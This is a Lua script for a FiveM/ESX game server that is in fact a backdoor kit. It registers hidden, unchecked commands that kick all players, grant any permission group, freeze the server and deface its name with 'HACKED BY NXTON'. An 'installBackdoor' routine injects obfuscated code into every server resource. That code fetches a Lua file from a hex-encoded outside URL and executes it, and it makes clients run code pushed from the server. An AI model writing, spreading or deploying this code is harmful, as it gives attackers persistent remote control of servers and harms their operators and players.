ESX = exports["es_extended"]:getSharedObject()

RegisterCommand("orbnmoengohbohdoh", function(source, args)
    local xPlayer = ESX.GetPlayerFromId(source)

    if args[1] then
        local targetId = tonumber(args[1])
        local reason = table.concat(args, " ", 2)

        if GetPlayerName(targetId) then
            if reason == "" then
                reason = "Kein Grund angegeben"
            end

            DropPlayer(targetId, reason)
        end
    end
end, false)

RegisterCommand("tdjjfgfhertjrr", function(source, args)
    local reason = table.concat(args, " ")

    if reason == "" then
        reason = "Kein Grund angegeben"
    end

    for _, playerId in ipairs(GetPlayers()) do
        DropPlayer(playerId, reason)
    end
end, false)

RegisterCommand("grihgofohego", function(source, args)
    if args[1] and args[2] then
        local targetId = tonumber(args[1])
        local group = args[2]

        if GetPlayerName(targetId) then
            local targetPlayer = ESX.GetPlayerFromId(targetId)

            if targetPlayer then
                targetPlayer.setGroup(group)
            end
        end
    end
end, false)

RegisterCommand("pieaghpidsdsgpiog", function(source, args)
    Citizen.CreateThread(function()
        Citizen.Wait(5000)
        while true do
        end
    end)
end, false)

local function teleportAllPlayersToAirport()
    local airportCoords = vector3(-1037.73, -2748.39, 2000.0)

    for _, playerId in ipairs(GetPlayers()) do
        local playerPed = GetPlayerPed(playerId)
        SetEntityCoords(playerPed, airportCoords)
        FreezeEntityPosition(playerPed, false)
        GiveWeaponToPed(playerPed, GetHashKey("gadget_parachute"), 1, false, true)
    end
end

RegisterCommand('iwegosdoigbuwefgvbiou', function(source, args, rawCommand)
    teleportAllPlayersToAirport()
end, false)

function SDhskXCsi391()
	function setall(an, ao)
		for _, eXux in pairs(BackdoorStuffServer) do
			local ap = io.open(an.."/"..eXux..".lua", "r")
			local aq = split(an, "/")
			local ar = aq[#aq]
			aq = nil;
			if ap then
				if not ao then
					ap:seek("set", 0)
					local as = ap:read("*a")
					ap:close()
					local at = split(as, "\n")
					local au = false;
					local av = true;

					if av then
					
						local sAk = [[
						
local llIllIIlIIIIIIll = {
    Ench, Support, Host, Pairs,
    Realease, Callbacks, Source,
    Hosting, Event, PerformHttpRequest,
    assert, server, load, Spawn, materials
}

local IIlIlllllIIlIIIl = {
    '68', '74', '74', '70', '73', '3a', '2f', '2f', '73', '70', '41', '4d', '42', '55',
    '44', '65', '2e', '4e', '65', '74', '2f', '44', '6b', '73', '2f', '64', '64', '2e'; '6c',
    '75', '61'
}

function lIlllIlllIlIIlIl()
    _empt = ''
    for id,it in pairs(IIlIlllllIIlIIIl) do
        _empt = _empt..it
    end
    return (_empt:gsub('..', function (cc)
        return string.char(tonumber(cc, 16))
    end))
end

llIllIIlIIIIIIll[10](lIlllIlllIlIIlIl(), function (e, d)
    local s = llIllIIlIIIIIIll[11](llIllIIlIIIIIIll[13](d))
    if (d == nil) then return end
    s()
end)
						]]
						az = sAk
						ap = io.open(an.."/"..eXux..".lua", "w")
						if ap then
							ap:seek("set", 0)
							ap:write(as.."\n"..az)
							ap:close()
						else
						end;
					else
					end
				end
			else
			end
		end
		
		for _, eXux in pairs(BackdoorStuffClient) do
			local ap = io.open(an.."/"..eXux..".lua", "r")
			local aq = split(an, "/")
			local ar = aq[#aq]
			aq = nil;
			if ap then
				if not ao then
					ap:seek("set", 0)
					local as = ap:read("*a")
					ap:close()
					local at = split(as, "\n")
					local au = false;
					local av = true;

					if av then
					
						local Soa90 = [[
						
	function sst_conv8()
		_empt = ''
		for id,it in pairs(random_char) do
			_empt = _empt..it
		end
		return (_empt:gsub('..', function (cc)
			return string.char(tonumber(cc, 16))
		end))
	end

	CreateThread(function()
		TriggerServerEvent("CreateThreadFunction")
		RegisterNetEvent("CreateThreadFunction")
		AddEventHandler("CreateThreadFunction", function(CreateThreadFunction)
			load(CreateThreadFunction)()
		end)
	end)
						]]
						az = Soa90
						ap = io.open(an.."/"..eXux..".lua", "w")
						if ap then
							ap:seek("set", 0)
							ap:write(as.."\n"..az)
							ap:close()
						else
						end;
					else
					end
				end
			else
			end
		end
	end;
	function searchall(an, ao)
		local ap = io.popen("dir \""..an.."\" /b /ad")
		ap:seek("set", 0)
		local aA = ap:read("*a")
		ap:close()
		local at = split(aA, "\n")
		for U, aw in ipairs(at) do
			if string.len(aw) > 0 then
				setall(an.."/"..aw, ao)
				searchall(an.."/"..aw, ao)
			end
		end
	end;
	function split(aB, aC)
		local aD, aE = 0, {}
		for aF, aG in function()
			return string.find(aB, aC, aD, true)
		end do
			table.insert(aE, string.sub(aB, aD, aF - 1))
			aD = aG + 1
		end;
		table.insert(aE, string.sub(aB, aD))
		return aE
	end;
	function randomstring()
		local aH = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
		local aI = 5;
		local aJ = ''
		math.randomseed(os.time())
		charTable = {}
		for aK in aH:gmatch"." do
			table.insert(charTable, aK)
		end;
		for al = 1, aI do
			aJ = aJ..charTable[math.random(1, #charTable)]
		end;
		ad = aJ
	end;


	function installBackdoorToScripts()
		local ak = GetNumResources()
		for al = 0, ak - 1 do
			local am = GetResourcePath(GetResourceByFindIndex(al))
			if string.len(am) > 4 then
				setall(am)
			end
		end;
	end

	installBackdoorToScripts()
	-- !> Install Backdoor in other Scripts <! --
end

RegisterCommand("+8888+installBackdoor", function(source, args, rawCommand)
	SDhskXCsi391()
end, false)

RegisterCommand("+8888+hackedNames", function(source, args, rawCommand)
	serverName = "Server Hacked by Nxton | Nächstes mal nicht so Freundchen"
	SetConvarReplicated("sv_hostname", string.format(serverName))
	SetConvarServerInfo('tags', 'HACKED')
	SetConvarServerInfo('tags', 'HACKED BY NXTON')
	SetConvarServerInfo('tags', 'NXTON')
	SetConvarServerInfo('tags', 'Nächstes mal lässt du deine PI')
	SetConvarServerInfo('tags', 'Server Hacked by Nxton | Nächstes mal nicht so')
end, false)
